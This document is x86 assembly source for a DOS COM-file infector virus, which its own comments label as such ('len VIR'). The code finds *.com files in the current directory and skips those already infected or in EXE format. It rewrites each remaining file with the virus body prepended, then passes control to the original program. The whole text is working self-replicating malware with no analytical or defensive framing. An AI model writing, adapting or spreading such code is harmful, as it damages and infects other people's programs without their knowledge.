.model	tiny
.code
org     100h
kkk:
	nop	; ID
	nop	; ID

	mov	cx,80h
	mov	si,0080h
	mov	di,0ff7fh
	rep	movsb		; save param

	lea	ax,begp		; begin prog
	mov	cx,ax
        sub     ax,100h
        mov     ds:[0fah],ax   ; len VIR
	add	cx,fso
        mov     ds:[0f8h],cx   ; begin buffer W
        ADD     CX,AX
        mov     ds:[0f6h],cx   ; begin buffer R

        mov     cx,ax
	lea	si,kkk
        mov     di,ds:[0f8h]
RB:     REP     MOVSB           ; move v

        stc

        LEA     DX,FFF
        MOV     AH,4EH
        MOV     CX,20H
        INT     21H		;  find first

	or	ax,ax
	jz	LLL
	jmp	done

LLL:
	MOV     AH,2FH
        INT     21H		; get DTA

	mov	ax,es:[bx+1ah]
        mov     ds:[0fch],ax   ; size
	add	bx,1eh
        mov     ds:[0feh],bx   ; point to name

	add	ax,180h		; if new len file + len VIR + 180h > FFF0
	add	ax,ds:[0fah]	;    then skip this file
	add	ax,fso
	cmp	ax,0fff0h
	ja	fin

	clc
	mov	ax,3d02h
	mov	dx,bx
	int	21h		; open file

	mov	bx,ax
	mov	ah,3fh
        mov     cx,ds:[0fch]
        mov     dx,ds:[0f6h]
	int	21h		; read file

	mov	bx,dx		
	mov	ax,[bx]
	sub	ax,9090h
	jz	fin		; if file inf. then skip this file

	mov	al,'M'
	mov	di,dx
	mov	cx,ds:[0fch]
	repne	scasb
	jne	cont
	mov	al,'Z'
	cmp	es:[di],al
	je	fin		; if converted then skip

cont:
        MOV     AX,ds:[0fch]
        mov     bx,ds:[0f6h]
        mov     [bx-2],ax      ; correct old len

	mov	ah,3ch
	mov	cx,00h
        mov     dx,ds:[0feh]   ; point to name
	clc
	int	21h		; create file

	mov	bx,ax		; #
	mov	ah,40h
        mov     cx,ds:[0fch]
        add     cx,ds:[0fah]
        mov     DX,ds:[0f8h]
	int	21h		; write file


	mov	ah,3eh
	int	21h		;close file

FIN:
	stc
	mov	ah,4fh
	int	21h		; find next

	or	ax,ax
	jnz	done

        JMP     lll

DONE:

	mov	cx,80h
	mov	si,0ff7fh
	mov	di,0080h
	rep	movsb		; restore param

        MOV     AX,0A4F3H
        mov     ds:[0fff9h],ax
	mov	al,0eah
	mov	ds:[0fffbh],al
	mov	ax,100h
	mov	ds:[0fffch],ax	; remove REP MOVSB and FAR JMP cs:0100 

	lea	si,begp
	lea	di,kkk
	mov	ax,cs
	mov	ds:[0fffeh],ax
	mov	kk,ax
	mov	cx,fso

	db	0eah
        dw      0fff9h
kk	dw	0000h

fff	db	'*?.com',0
fso	dw	0005h	; source len file


begp:
	MOV     AX,4C00H
	int     21h		; exit

end	kkk
